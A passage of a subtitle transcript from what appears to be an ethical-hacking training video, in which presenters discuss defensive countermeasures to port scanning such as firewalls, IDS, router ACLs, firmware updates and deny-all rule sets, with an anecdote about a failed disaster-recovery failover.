countermeasures?\n\n46\n00:02:19.010 --> 00:02:23.460\nWhat are the things that as a CH, we\nshould be doing to prevent the bad actors\n\n47\n00:02:23.460 --> 00:02:27.040\noutside that are trying to do this against\nour networks from being successful?\n\n48\n00:02:27.040 --> 00:02:29.860\nFor everything we do,\nthere's a counter measure.\n\n49\n00:02:29.860 --> 00:02:34.380\nIf I wanna make sure that I can't scan a\nsystem and expose it's vulnerabilities and\n\n50\n00:02:34.380 --> 00:02:36.220\nweaknesses, I have to\ntake certain steps and\n\n51\n00:02:36.220 --> 00:02:40.500\nthere's some common sense things and some\nout of this world kinda crazy wacky things\n\n52\n00:02:40.500 --> 00:02:42.650\nthat I can do to safeguard that system.\n\n53\n00:02:42.650 --> 00:02:45.650\nI can unplug it from the network and\nnot allow anybody to talk to it.\n\n54\n00:02:45.650 --> 00:02:49.186\nThat would certainly protect it and render\nit essentially invisible, it would also\n\n55\n00:02:49.186 --> 00:02:51.896\nrender it probably inoperable for\nmost of the things I wanna do.\n\n56\n00:02:51.896 --> 00:02:55.807\nBut it's a question of just what kind\nof defense you actually wanna achieve,\n\n57\n00:02:55.807 --> 00:02:57.440\nwhat kind of a posture you want.\n\n58\n00:02:57.440 --> 00:03:02.090\nSo when we think about port scan and\ncountermeasures, or counter things,\n\n59\n00:03:02.090 --> 00:03:06.020\ncounter attack instances, probably not\nthe best way to be thinking about that,\n\n60\n00:03:06.020 --> 00:03:07.500\ncounter measures, let's go with that.\n\n61\n00:03:07.500 --> 00:03:10.500\nWe think about port scanning counter\nmeasures that we wanna be able to use,\n\n62\n00:03:10.500 --> 00:03:13.020\nthere are some common sense\nthings that rise to the surface.\n\n63\n00:03:13.020 --> 00:03:14.820\nWe should be using firewalls and\n\n64\n00:03:14.820 --> 00:03:18.280\nIDSs to block,\nthis kind of inbound scanning traffic.\n\n65\n00:03:18.280 --> 00:03:22.470\nSo when we see somebody\nwalking through with TCP\n\n66\n00:03:23.690 --> 00:03:28.330\npackets incrementally, port 1, port 2,\nport 3 and hitting that machine,\n\n67\n00:03:28.330 --> 00:03:32.995\nlooking at every port as we go or\nrange of ports, we can sense a pattern.\n\n68\n00:03:32.995 --> 00:03:34.905\nAnd we know what that pattern equates to.\n\n69\n00:03:34.905 --> 00:03:38.725\nIt equates to somebody looking to probe,\nand to scan that machine.\n\n70\n00:03:38.725 --> 00:03:42.125\nFrom a recon, or a fingerprinting,\nand a footprinting perspective,\n\n71\n00:03:42.125 --> 00:03:43.665\ntrying to understand what's there.\n\n72\n00:03:43.665 --> 00:03:45.222\nWe should be be blocking that traffic.\n\n73\n00:03:45.222 --> 00:03:48.822\nI made reference to in the prior\nconversation the fact that\n\n74\n00:03:48.822 --> 00:03:50.572\nwhen we tried to connect out and\ngot a, hey,\n\n75\n00:03:50.572 --> 00:03:54.712\nsorry nothing here with the autoscan\nbecause the firewall was up and running.\n\n76\n00:03:54.712 --> 00:03:59.312\nWhen we did the carry end map idle scan in\nthe last episode and I showed that that\n\n77\n00:03:59.312 --> 00:04:03.132\nrange didn't have active machines but it\ncame back once Smith went and said, sorry,\n\n78\n00:04:03.132 --> 00:04:06.490\nI can't connect anything, it's probably\nfirewalls running on those devices.\n\n79\n00:04:06.490 --> 00:04:07.710\nThey're being blocked.\n\n80\n00:04:07.710 --> 00:04:08.710\nThat inbound scan,\n\n81\n00:04:08.710 --> 00:04:12.720\nthat port traffic, is being blocked,\nat the firewall on the device.\n\n82\n00:04:12.720 --> 00:04:16.830\nMost systems today, most operating\nsystems that are on machines,\n\n83\n00:04:16.830 --> 00:04:19.770\nare gonna have some sort\nof build in firewall.\n\n84\n00:04:19.770 --> 00:04:21.760\nAnd as a result,\nthat firewall traditionally,\n\n85\n00:04:21.760 --> 00:04:24.730\nmore often than not,\nis turned on on the desktop anyway.\n\n86\n00:04:24.730 --> 00:04:28.680\nIt's turned on out of the box, on the\nserver it's probably turned on, as well.\n\n87\n00:04:28.680 --> 00:04:31.840\nWe may modify that, control that\nwith policies and that's fine.\n\n88\n00:04:31.840 --> 00:04:36.440\nBut the common sense approach is let's\nset the firewall up and have it up and\n\n89\n00:04:36.440 --> 00:04:39.570\nrunning to block the majority of\nthat inbound and unwanted traffic.\n\n90\n00:04:39.570 --> 00:04:40.870\nSo we should be doing that.\n\n91\n00:04:40.870 --> 00:04:43.760\nWe may have to create one or\nmore rule sets to block it.\n\n92\n00:04:43.760 --> 00:04:46.570\nWe may have to create exceptions\nthat will allow us to\n\n93\n00:04:46.570 --> 00:04:49.360\nessentially push certain traffic\nthrough the firewall and or\n\n94\n00:04:49.360 --> 00:04:53.670\nthe IDS will allow it to go, but we wanna\nblock the majority of that traffic.\n\n95\n00:04:53.670 --> 00:04:56.140\nSo inbound scanning should\nbe blocked at the gateway,\n\n96\n00:04:56.140 --> 00:04:57.840\nat the border of our networks.\n\n97\n00:04:57.840 --> 00:04:59.990\nIt just a good common sense approach.\n\n98\n00:04:59.990 --> 00:05:04.125\nWe should run port scanning tools the way\nwe've shown you you can do in the last\n\n99\n00:05:04.125 --> 00:05:07.117\nepisode against our systems\ninternally to make sure and\n\n100\n00:05:07.117 --> 00:05:10.741\nby the way from outside, to make\nsure that those rules are in place,\n\n101\n00:05:10.741 --> 00:05:14.135\nthey are effective,\nthey're blocking the inbound traffic.\n\n102\n00:05:14.135 --> 00:05:18.570\nTrust but verify is a great\nway of looking at the world.\n\n103\n00:05:18.570 --> 00:05:21.930\nWhen we think about the fact\nthat if we set the rules up and\n\n104\n00:05:21.930 --> 00:05:24.470\nwe do our job the right way,\nthey should be working.\n\n105\n00:05:24.470 --> 00:05:27.160\nBut what was the last time you did\neverything that you were suppose to do and\n\n106\n00:05:27.160 --> 00:05:28.870\ndidn't make a mistake?\n\n107\n00:05:28.870 --> 00:05:29.480\n>> I can't remember.\n\n108\n00:05:29.480 --> 00:05:31.220\n>> Doesn't happen very often.\n\n109\n00:05:31.220 --> 00:05:33.750\nEspecially not with something\ncomplicated like this.\n\n110\n00:05:33.750 --> 00:05:38.325\nAll it takes is one little switch and\nthe rule to be off, one little port number\n\n111\n00:05:38.325 --> 00:05:42.625\nreference to be off to open up a series\nof ports that you wanna block by mistake.\n\n112\n00:05:42.625 --> 00:05:44.165\nCreating the rule in\nthe wrong way in other words,\n\n113\n00:05:44.165 --> 00:05:47.425\nthe wrong traffic flow will open\ntraffic instead of blocking it.\n\n114\n00:05:47.425 --> 00:05:49.515\n>> Right, I've been putting\nrules in the wrong order.\n\n115\n00:05:49.515 --> 00:05:53.300\n>> Or in the wrong order, so they execute\nessentially you allow the traffic and\n\n116\n00:05:53.300 --> 00:05:54.050\nthen we should block it.\n\n117\n00:05:54.050 --> 00:05:55.430\nWell, sorry traffic already went through.\n\n118\n00:05:55.430 --> 00:05:57.234\nWe can't block it after you allowed it,\njust doesn't work that way.\n\n119\n00:05:57.234 --> 00:06:00.510\nIf you wanna block you should block it and\nnot allow it.\n\n120\n00:06:00.510 --> 00:06:03.330\nSo we wanna make sure that you've\ndone that the right way and\n\n121\n00:06:03.330 --> 00:06:07.230\nthere's nothing like checking, so\nmake sure that you're actually spot on.\n\n122\n00:06:07.230 --> 00:06:09.570\nSo the second counter measure\nwe would think about and\n\n123\n00:06:09.570 --> 00:06:11.820\noften recommend is,\nlet's verify what you did.\n\n124\n00:06:11.820 --> 00:06:13.250\nLet's test from the outside.\n\n125\n00:06:13.250 --> 00:06:14.720\nMake sure we can't scan in.\n\n126\n00:06:14.720 --> 00:06:16.300\nCuz if we can't do it, guess what?\n\n127\n00:06:16.300 --> 00:06:18.130\nThe bad guys aren't gonna\nbe able to do it either.\n\n128\n00:06:18.130 --> 00:06:19.310\nWe've got more knowledge than they do.\n\n129\n00:06:19.310 --> 00:06:22.310\nAnd if we can't get in, chances\nare good they're not gonna be able to.\n\n130\n00:06:22.310 --> 00:06:24.630\nBut let's not forget what's going\non in the internal network.\n\n131\n00:06:25.960 --> 00:06:27.715\nMost studies show, most of the studies,\n\n132\n00:06:27.715 --> 00:06:31.026\nwe've talk about some of these in prior\nepisodes where we talked about, hey,\n\n133\n00:06:31.026 --> 00:06:33.046\ngo out and look for\nsome of these trend reports.\n\n134\n00:06:33.046 --> 00:06:35.635\nThe Ponemon Institute reports.\n\n135\n00:06:35.635 --> 00:06:37.885\nThe Verizon DBIR report.\n\n136\n00:06:37.885 --> 00:06:39.150\nIBMs report.\n\n137\n00:06:39.150 --> 00:06:44.017\nHPs report on the trends in information\nsecurity year in and year out.\n\n138\n00:06:44.017 --> 00:06:47.477\nMost of these studies show,\nhistorically and in trends,\n\n139\n00:06:47.477 --> 00:06:52.567\nthat we still face a significant\nthreat from internal bad actors.\n\n140\n00:06:52.567 --> 00:06:56.477\nPissed off people that work for us\n[LAUGH] that work inside our networks and\n\n141\n00:06:56.477 --> 00:07:00.173\nhave access that for\nwhatever reason are looking to do us harm.\n\n142\n00:07:00.173 --> 00:07:03.443\nWe don't know why and quite honestly\nthat's not the point of this conversation.\n\n143\n00:07:03.443 --> 00:07:04.454\nI don't wanna get in your head.\n\n144\n00:07:04.454 --> 00:07:08.223\nI just wanna understand that if you're\nout there I wanna defend against you.\n\n145\n00:07:08.223 --> 00:07:11.876\nCuz if I try to make this a one-on-one\nbattle, I'm never gonna see the other 90\n\n146\n00:07:11.876 --> 00:07:14.036\npeople that are trying to come and\ntake information from me.\n\n147\n00:07:14.036 --> 00:07:18.856\nSo I wanna check and see internally\nwhether I got firewalls running on\n\n148\n00:07:18.856 --> 00:07:24.130\nthose devices so that if I get\npassed the board of gateway device,\n\n149\n00:07:24.130 --> 00:07:27.940\nby some miracle cuz the rule get screwed\nup to have a secondary layer of defense.\n\n150\n00:07:27.940 --> 00:07:30.860\nThis is thee defense in depth\nconcept that we keep reminding\n\n151\n00:07:30.860 --> 00:07:32.530\nourselves about them talking about.\n\n152\n00:07:32.530 --> 00:07:35.000\nSo I wanna have multiple\nfirewalls running.\n\n153\n00:07:35.000 --> 00:07:37.940\nI wanna make it as difficult as\npossible for you to get to that box.\n\n154\n00:07:37.940 --> 00:07:41.853\nI should have a firewall running\non a boarder gateway access point,\n\n155\n00:07:41.853 --> 00:07:45.697\nI should have an internal firewall\nrunning on a subnet or on a VLAN or\n\n156\n00:07:45.697 --> 00:07:48.649\nwhatever it may be on\nthe individual end point, and\n\n157\n00:07:48.649 --> 00:07:52.799\nI wanna make sure that firewall is\nalso blocking inbound ping traffic.\n\n158\n00:07:52.799 --> 00:07:55.717\nIf you have a problem internally,\nyou have to diagnose or troubleshoot,\n\n159\n00:07:55.717 --> 00:07:56.712\nyou need to enable ping.\n\n160\n00:07:56.712 --> 00:07:58.246\nThen you do the right thing.\n\n161\n00:07:58.246 --> 00:08:00.342\nYou turn it on as an administrator for\na period of time.\n\n162\n00:08:00.342 --> 00:08:03.747\nYou troubleshoot, and then you do\nthe right thing by turning it off again.\n\n163\n00:08:03.747 --> 00:08:04.796\nYou don't leave it on and just say.\n\n164\n00:08:04.796 --> 00:08:06.805\nYeah ok, no big deal it's inside.\n\n165\n00:08:06.805 --> 00:08:09.340\nNobody's gonna be able to get\nto it cuz we've got this great\n\n166\n00:08:09.340 --> 00:08:10.730\nborder defense set up.\n\n167\n00:08:10.730 --> 00:08:12.620\nAnd nobody's gonna be able to get through.\n\n168\n00:08:12.620 --> 00:08:13.890\nWell they may not be able to.\n\n169\n00:08:13.890 --> 00:08:16.210\nBut they may be able to, right?\n\n170\n00:08:16.210 --> 00:08:17.860\nAnd if they do, then what's gonna happen?\n\n171\n00:08:17.860 --> 00:08:20.590\nYou've got to have a secondary and\nmaybe even a tertiary.\n\n172\n00:08:20.590 --> 00:08:21.160\nRight.\n\n173\n00:08:21.160 --> 00:08:22.290\nLine of defense.\n\n174\n00:08:22.290 --> 00:08:23.312\nVery, very important.\n\n175\n00:08:23.312 --> 00:08:25.491\nHaven't you ever seen all those sci-fi\nmovies where the aliens come down.\n\n176\n00:08:25.491 --> 00:08:27.650\nAnd they kill everybody initially.\n\n177\n00:08:27.650 --> 00:08:30.390\nAnd then only two survivors come out and\nbattle it out, right?\n\n178\n00:08:30.390 --> 00:08:32.919\nSo, you gotta have those\nlittle additional things.\n\n179\n00:08:32.919 --> 00:08:34.371\nYou know they're remaking\nIndependence Day?\n\n180\n00:08:34.371 --> 00:08:36.602\n>> We were just talking about that.\n\n181\n00:08:36.602 --> 00:08:37.775\n>> [CROSSTALK]\n>> And, yeah, but\n\n182\n00:08:37.775 --> 00:08:39.390\nyou're excited in one respect.\n\n183\n00:08:39.390 --> 00:08:41.020\nBut here's the problem with that, right?\n\n184\n00:08:41.020 --> 00:08:42.020\nJust like every good movie.\n\n185\n00:08:42.020 --> 00:08:44.500\nAnd for what it was,\nit was a good movie at the time, right?\n\n186\n00:08:44.500 --> 00:08:45.161\nBut here was the problem.\n\n187\n00:08:45.161 --> 00:08:47.030\nYou're gonna take a good movie and\nremake it.\n\n188\n00:08:47.030 --> 00:08:48.720\nAnd probably just mess it up.\n\n189\n00:08:48.720 --> 00:08:50.520\n>> Probably.\n>> I mean that's the problem, right?\n\n190\n00:08:50.520 --> 00:08:52.970\nSequels don't ever tend to\nbe as good as the originals.\n\n191\n00:08:52.970 --> 00:08:53.540\n>> And I don't think they.\n\n192\n00:08:53.540 --> 00:08:54.270\n>> Very few of them.\n\n193\n00:08:54.270 --> 00:08:55.890\n>> The original cast isn't coming back.\n\n194\n00:08:55.890 --> 00:08:56.410\n>> See, that I don't know.\n\n195\n00:08:56.410 --> 00:08:57.240\nI don't know about that.\n\n196\n00:08:57.240 --> 00:08:59.200\nThat would then just,\nimmediately I'm done.\n\n197\n00:08:59.200 --> 00:09:01.022\nI'm not going to go.\n\n198\n00:09:01.022 --> 00:09:03.230\nI'm gonna go scan someone's network\ninstead of seeing that movie.\n\n199\n00:09:03.230 --> 00:09:05.100\nThat's what I'm gonna do instead.\n\n200\n00:09:05.100 --> 00:09:06.480\nLooking for weaknesses, right?\n\n201\n00:09:06.480 --> 00:09:08.336\nSo, we're gonna do port\nscanning from inside.\n\n202\n00:09:08.336 --> 00:09:10.110\nAnd also we're gonna do it from outside.\n\n203\n00:09:10.110 --> 00:09:12.672\nAgain, we want to verify everything\nthat's going on in the network.\n\n204\n00:09:12.672 --> 00:09:17.210\nWe're gonna make sure that we look at\nrouting and filtering on our routers,\n\n205\n00:09:17.210 --> 00:09:20.890\nour switches, access control lists,\nallowing, denying.\n\n206\n00:09:20.890 --> 00:09:22.460\nEvery device on the perimeter.\n\n207\n00:09:22.460 --> 00:09:24.550\nEvery device that touches that traffic.\n\n208\n00:09:24.550 --> 00:09:25.960\nShould be probed and tested.\n\n209\n00:09:25.960 --> 00:09:27.920\nDo we have the right ACLs on our routers?\n\n210\n00:09:27.920 --> 00:09:29.190\nWe should be blocking ports there.\n\n211\n00:09:29.190 --> 00:09:32.310\nAnd not allowing to block\nprotocols rather, and our ports.\n\n212\n00:09:32.310 --> 00:09:35.100\nAnd traffic not allowing that\ninformation to come through.\n\n213\n00:09:35.100 --> 00:09:37.763\nIf we do it at the firewall but\nwe allow it at the router.\n\n214\n00:09:37.763 --> 00:09:40.798\nWe're backing off one level from where\nwe should actually be interdicting\n\n215\n00:09:40.798 --> 00:09:41.430\nthis traffic.\n\n216\n00:09:41.430 --> 00:09:42.931\nWe have to be thinking about that as well.\n\n217\n00:09:42.931 --> 00:09:46.572\nSo make sure not just that\nwe have the right configs.\n\n218\n00:09:46.572 --> 00:09:49.785\nBut, step four in the reports counting\ncounter measure conversation.\n\n219\n00:09:49.785 --> 00:09:52.380\nWhat about firmware updates\nto all these devices?\n\n220\n00:09:52.380 --> 00:09:54.680\nWhen was the last time you\nupdated your firmware?\n\n221\n00:09:54.680 --> 00:09:56.960\nAnd if you've gotta scratch your head and\nthink about that.\n\n222\n00:09:56.960 --> 00:09:59.341\nI'm thinking maybe you're not\nas up to date as you need to be.\n\n223\n00:09:59.341 --> 00:10:01.810\nYou know vendors put out firmware.\n\n224\n00:10:01.810 --> 00:10:03.353\nAnd vendors put out firmware updates.\n\n225\n00:10:03.353 --> 00:10:06.087\nThey may not put it out as often\nas they do security patches and\n\n226\n00:10:06.087 --> 00:10:07.599\nupdates on an operating system.\n\n227\n00:10:07.599 --> 00:10:09.670\nDoesn't mean it's any less important.\n\n228\n00:10:09.670 --> 00:10:12.554\nAnd if you're not keeping up with\nthat you have a security liability.\n\n229\n00:10:12.554 --> 00:10:13.798\nThere's a vulnerability there.\n\n230\n00:10:13.798 --> 00:10:17.421\nBecause the vendor put out that\nfirmware update to add features and\n\n231\n00:10:17.421 --> 00:10:19.885\nprobably adjust and modify functionality.\n\n232\n00:10:19.885 --> 00:10:22.255\nBecause there may, or may not be concerns.\n\n233\n00:10:22.255 --> 00:10:24.550\nI'm not saying every firmware\nupdate is security related.\n\n234\n00:10:24.550 --> 00:10:28.960\nWhat I am pointing out though is that\nevery firmware update will make you\n\n235\n00:10:28.960 --> 00:10:31.250\noperate at a different\nlevel than you were before.\n\n236\n00:10:31.250 --> 00:10:34.380\nAnd that can be a better thing\nif it involves security.\n\n237\n00:10:34.380 --> 00:10:37.090\nThe other challenge we have here is if\nyou have different patch levels, right.\n\n238\n00:10:37.090 --> 00:10:39.880\nSometimes you upgrade certain firm\nware and forget to do others.\n\n239\n00:10:39.880 --> 00:10:41.932\nNow all of a sudden we have\nan imbalanced network.\n\n240\n00:10:41.932 --> 00:10:43.469\nYou have some devices\noperating in a higher level.\n\n241\n00:10:43.469 --> 00:10:46.770\nPerhaps implementing new protocol,\nnew features support.\n\n242\n00:10:46.770 --> 00:10:49.580\nOther firewalls, other devices\nother routers whatever they are.\n\n243\n00:10:49.580 --> 00:10:52.854\nMay not be, and this could lead to\ncatastrophic outcomes and consequences.\n\n244\n00:10:52.854 --> 00:10:56.775\nI have a customer,\na client of mine that I talk\n\n245\n00:10:56.775 --> 00:11:01.430\nabout this story all the time\nin BCDR conversations.\n\n246\n00:11:01.430 --> 00:11:04.653\nAnd I use this example with customers\nto show them what not to do.\n\n247\n00:11:04.653 --> 00:11:09.773\nSo these guys, major, major network\ninfrastructure, a very, very large\n\n248\n00:11:09.773 --> 00:11:15.621\nenterprise, huge, huge investment in\ninfrastructure and Cisco and routing, etc.\n\n249\n00:11:15.621 --> 00:11:20.897\nThey went ahead, they did a major platform\nuplift right before they did a BCDR test.\n\n250\n00:11:20.897 --> 00:11:22.840\nAnd they put everything in place.\n\n251\n00:11:22.840 --> 00:11:26.330\nPut new infrastructure backbones,\nrouters, things like that in.\n\n252\n00:11:26.330 --> 00:11:27.870\nDid all the upgrades.\n\n253\n00:11:27.870 --> 00:11:30.815\nAnd then went to do a BCDR test\nabout a month later after they\n\n254\n00:11:30.815 --> 00:11:32.310\nfinalized everything.\n\n255\n00:11:32.310 --> 00:11:34.911\nThey fail over,\nfull live fail over test, right.\n\n256\n00:11:34.911 --> 00:11:36.704\nThey have to this under mandate.\n\n257\n00:11:36.704 --> 00:11:39.252\nThey're federally regulated based\non the industry they're in.\n\n258\n00:11:39.252 --> 00:11:42.018\nAnd so as a result,\nthey fail over nothing happens.\n\n259\n00:11:42.018 --> 00:11:45.470\n>> Uh-huh\n>> No traffic shows up at the other end.\n\n260\n00:11:45.470 --> 00:11:46.490\nThe DR team is waiting.\n\n261\n00:11:46.490 --> 00:11:48.260\nAnd they can't get the traffic inbound.\n\n262\n00:11:48.260 --> 00:11:49.460\nAll right, no big deal,\nsomething went wrong.\n\n263\n00:11:49.460 --> 00:11:50.030\nLet's fail back.\n\n264\n00:11:50.030 --> 00:11:50.740\nThey go to fail back.\n\n265\n00:11:50.740 --> 00:11:51.690\nThey can't fail back.\n\n266\n00:11:51.690 --> 00:11:54.020\nThey essentially,\nfailed off into a black hole.\n\n267\n00:11:54.020 --> 00:11:55.820\nAll their traffic was exiting the network.\n\n268\n00:11:55.820 --> 00:11:57.520\nAnd they couldn't figure\nout where it was going.\n\n269\n00:11:57.520 --> 00:12:00.690\nDid not go to the DR site,\nwas not coming back.\n\n270\n00:12:00.690 --> 00:12:02.240\nAnd was essentially gone.\n\n271\n00:12:02.240 --> 00:12:04.620\nTook them three days\nworking with the vendor,\n\n272\n00:12:04.620 --> 00:12:07.690\nwith Cisco to escalate\nthis to figure it out.\n\n273\n00:12:07.690 --> 00:12:09.990\nThey had done a major platform upgrade.\n\n274\n00:12:09.990 --> 00:12:14.680\nAnd they had done replacements on some\nof their core routing infrastructure.\n\n275\n00:12:14.680 --> 00:12:18.550\nBecause of that, they had done firmware\nupdates to existing infrastructure.\n\n276\n00:12:18.550 --> 00:12:22.080\nThey had missed one router,\nand missed patching\n\n277\n00:12:22.080 --> 00:12:26.550\none piece of firmware to bring it up to\nthe operational level of everything else.\n\n278\n00:12:26.550 --> 00:12:29.010\nAnd that piece happened to\nbe the critical lynchpin.\n\n279\n00:12:29.010 --> 00:12:32.083\nThat was handling the redundant\npathing for the failover.\n\n280\n00:12:32.083 --> 00:12:34.663\nAnd they could get out but they couldn't\nfail back because there was no route back.\n\n281\n00:12:34.663 --> 00:12:37.280\nAnd they couldn't recover.\n\n282\n00:12:37.280 --> 00:12:39.423\nBecause they couldn't figure out\nhow to bring the traffic back in.\n\n283\n00:12:39.423 --> 00:12:40.791\nAnd they had everything on the LAN.\n\n284\n00:12:40.791 --> 00:12:43.207\nThey couldn't get anything going out.\n\n285\n00:12:43.207 --> 00:12:43.790\n>> No.\n>> And\n\n286\n00:12:43.790 --> 00:12:48.220\nit took them three days to track this down\nand figure out what went wrong, patch it.\n\n287\n00:12:48.220 --> 00:12:50.210\nReset everything and\nactually get it working.\n\n288\n00:12:50.210 --> 00:12:53.550\nSo, this can be a very big problem if\nyou're not paying attention to it.\n\n289\n00:12:53.550 --> 00:12:57.780\nFirmware updates, tremendous,\ntremendous opportunity to do good.\n\n290\n00:12:57.780 --> 00:13:00.480\nTremendous opportunity to really mess\nthings up if you're not paying attention\n\n291\n00:13:00.480 --> 00:13:01.560\nto detail there.\n\n292\n00:13:01.560 --> 00:13:04.750\nYou want to make sure you add\ncustom rulesets into these devices.\n\n293\n00:13:04.750 --> 00:13:07.990\nBlock every port that you do\nnot want to see traffic from.\n\n294\n00:13:07.990 --> 00:13:09.664\nYou should actually have a deny all rule.\n\n295\n00:13:09.664 --> 00:13:10.829\nRight?\nThat's your catch all in general.\n\n296\n00:13:10.829 --> 00:13:15.596\nBut you're gonna open traffic up if you\nfollow one set of best practice standards\n\n297\n00:13:15.596 --> 00:13:16.940\nor recommendations.\n\n298\n00:13:16.940 --> 00:13:18.190\nYou could do it two ways.\n\n299\n00:13:18.190 --> 00:13:19.870\nYou can essentially allow everything,\n\n300\n00:13:19.870 --> 00:13:23.150\nblocking as you go with\na deny all at the bottom.\n\n301\n00:13:23.150 --> 00:13:27.470\nOr you can deny everything, opening as\nyou go with a denial at the bottom.\n\n302\n00:13:27.470 --> 00:13:28.570\nEither way works.\n\n303\n00:13:28.570 --> 00:13:31.420\nBut you've got to be really good at\nunderstanding what you want to allow or\n\n304\n00:13:31.420 --> 00:13:32.970\nblock to do this.\n\n305\n00:13:32.970 --> 00:13:35.510\nI would prefer to start with\nblocking everything and\n\n306\n00:13:35.510 --> 00:13:39.070\nonly allow ports opened that I\nknow I need to pass traffic for.\n\n307\n00:13:39.070 --> 00:13:41.900\nIt's more of a pain because you have\nall these exceptions popping up and\n\n308\n00:13:41.900 --> 00:13:43.320\nall these things going wrong.\n\n309\n00:13:43.320 --> 00:13:45.550\nThat you have to now start dealing with.\n\n310\n00:13:45.550 --> 00:13:48.200\nBut once you get past\nthat initial concern,\n\n311\n00:13:48.200 --> 00:13:50.080\nyou've got everything\nlocked down essentially.\n\n312\n00:13:50.080 --> 00:13:52.160\nYou're on the opening ports on demand.\n\n313\n00:13:52.160 --> 00:13:53.870\nWhen you have a service requirement,\n\n314\n00:13:53.870 --> 00:13:55.570\nyou're not letting anything\nthrough that you don't know.\n\n315\n00:13:55.570 --> 00:13:58.280\n>> Mm.\n>> I mean, it's a little draconian, but\n\n316\n00:13:58.280 --> 00:13:59.800\nit works really well.\n\n317\n00:13:59.800 --> 00:14:00.614\nRight?\nWhereas,\n\n318\n00:14:00.614 --> 00:14:02.068\nif you start with everything open.\n\n319\n00:14:02.068 --> 00:14:07.160\nYou essentially are flooding 65,535 ports\nworth of traffic through that system.\n\n320\n00:14:08.170 --> 00:14:11.895\nWith a then mentality saying,\nlet's start blocking what we don't want.\n\n321\n00:14:11.895 --> 00:14:14.200\nYeah well,\nwe know everything form 49,000 up is gone.\n\n322\n00:14:14.200 --> 00:14:15.290\nWe don't need that.\n\n323\n00:14:15.290 --> 00:14:15.920\nOkay.\n\n324\n00:14:15.920 --> 00:14:16.720\nBut are you sure?\n\n325\n00:14:16.720 --> 00:14:17.620\nWell, I don't know I think so.\n\n326\n00:14:17.620 --> 00:14:19.730\nLets block it until somebody complains.\n\n327\n00:14:19.730 --> 00:14:23.710\nOkay, I'd rather deny everything and have\nthem complain and open it is my point.\n\n328\n00:14:23.710 --> 00:14:25.504\nRight.\nBecause you essentially wind up in\n\n329\n00:14:25.504 --> 00:14:26.272\nthe same place.\n\n330\n00:14:26.272 --> 00:14:29.102\nBut you're a lot more likely to not\nscrew it up if you block everything.\n\n331\n00:14:29.102 --> 00:14:32.200\nAnd only open up what\npeople tell you they want.\n\n332\n00:14:32.200 --> 00:14:34.180\nSo you gotta be smart about this, right?\n\n333\n00:14:34.180 --> 00:14:35.500\nYou should be blocking everything.\n\n334\n00:14:35.500 --> 00:14:38.370\nAnd then only allowing open those\nports you want to pass traffic on.\n\n335\n00:14:38.370 --> 00:14:40.065\nIt's gonna make your life a lot easier.\n\n336\n00:14:40.065 --> 00:14:40.821\n>> [LAUGH]\n>> Trust me,\n\n337\n00:14:40.821 --> 00:14:44.290\nyou wanna make sure that you\nare setting up these rules.\n\n338\n00:14:44.290 --> 00:14:46.317\nAnd this is again, something people miss.\n\n339\n00:14:46.317 --> 00:14:48.962\nAnd there's two schools of\nthought with this, right.\n\n340\n00:14:48.962 --> 00:14:52.960\nWe're gonna have hopefully,\ndifferent hardware from different vendors.\n\n341\n00:14:52.960 --> 00:14:53.621\nRight, doing different things.\n\n342\n00:14:53.621 --> 00:14:58.192\nWe're not gonna buy just Cisco gear and\nuse Cisco firewalls and Cisco IDS and\n\n343\n00:14:58.192 --> 00:14:59.205\nIPS solutions.\n\n344\n00:14:59.205 --> 00:15:02.113\nBecause you know there may be\na weakness in that platform and\n\n345\n00:15:02.113 --> 00:15:04.640\nwe wanna have a variety of solutions,\nright.\n\n346\n00:15:04.640 --> 00:15:06.505\nWe may wanna use Checkpoint firewalls.\n\n347\n00:15:06.505 --> 00:15:08.327\nAnd then we may wanna use Cisco routers.\n\n348\n00:15:08.327 --> 00:15:13.810\nAnd we may wanna use firewalls, or rather\nmy DS IPS solutions from somebody else.\n\n349\n00:15:13.810 --> 00:15:14.335\nRight, whoever.\nSo\n\n350\n00:15:14.335 --> 00:15:17.580\nyou may have to create rules\nacross different platforms.\n\n351\n00:15:17.580 --> 00:15:19.480\nBecause there may not be one set of\nrules that you can simply share.\n\n352\n00:15:19.480 --> 00:15:21.385\nAnd that's not a bad thing.\n\n353\n00:15:21.385 --> 00:15:24.147\nBut you wanna make sure that you\nhave a checklist of what those rules\n\n354\n00:15:24.147 --> 00:15:25.047\nhave to accomplish.\n\n355\n00:15:25.047 --> 00:15:27.740\nAnd that you're able to then\nreproduce those rules properly.\n\n356\n00:15:27.740 --> 00:15:28.680\nPlatform to platform.\n\n357\n00:15:28.680 --> 00:15:31.808\nAnd this is also something that people\nsometimes miss and forget about and\n\n358\n00:15:31.808 --> 00:15:32.960\ndon't understand.\n\n359\n00:15:32.960 --> 00:15:35.145\nAnd we have to think about them and\nbe aware of as well.\n\n360\n00:15:35.145 --> 00:15:40.330\nI have lot's and lots of stories that I\ncould share with you about people thinking\n\n361\n00:15:40.330 --> 00:15:44.560\nthat they could just mirror rules on\nthe same platform between like Cisco gear.\n\n362\n00:15:44.560 --> 00:15:47.080\nAnd screwing it up, because the rules\nare from different versions.\n\n363\n00:15:47.080 --> 00:15:50.810\nAnd it didn't quite translate, or some\nthings were supported, others were not.\n\n364\n00:15:50.810 --> 00:15:52.540\nCrazy stuff happens, right?\n\n365\n00:15:52.540 --> 00:15:55.330\nSo you've gotta understand that\nit's not as simple as just saying.\n\n366\n00:15:55.330 --> 00:15:56.210\nYeah, I want that.\n\n367\n00:15:56.210 --> 00:15:58.180\nAnd I want it to be done\nin these five places.\n\n368\n00:15:58.180 --> 00:16:00.470\nYou've gotta have a methodology\nlike we keep talking about.\n\n369\n00:16:00.470 --> 00:16:03.211\nAnd you've gotta execute on that\nmethodology time in and time out,\n\n370\n00:16:03.211 --> 00:16:03.942\nagain and again.\n\n371\n00:16:03.942 --> 00:16:05.474\nSo we do wanna be thinking about that.\n\n372\n00:16:05.474 --> 00:16:09.349\nWe do wanna make sure that we're thinking\nabout the ways in which we may be\n\n373\n00:16:09.349 --> 00:16:14.005\nable to use that information to our\nadvantage as counter measure points.\n\n374\n00:16:14.005 --> 00:16:17.180\nWe've talked about different\nmethodologies, different things we would\n\n375\n00:16:17.180 --> 00:16:20.705\ndo with regards to going in and\ndoing scanning and scanning of networks.\n\n376\n00:16:20.705 --> 00:16:23.715\nWe mentioned going in and\ndoing banner grabbing and\n\n377\n00:16:23.715 --> 00:16:27.615\ntalk about scrubbing the banner\ninformation, the header information out of\n\n378\n00:16:27.615 --> 00:16:31.940\nthe return packets that come back\nfrom an HTTP or a web server.\n\n379\n00:16:31.940 --> 00:16:33.910\nWhen we do a get HTTP request.\n\n380\n00:16:33.910 --> 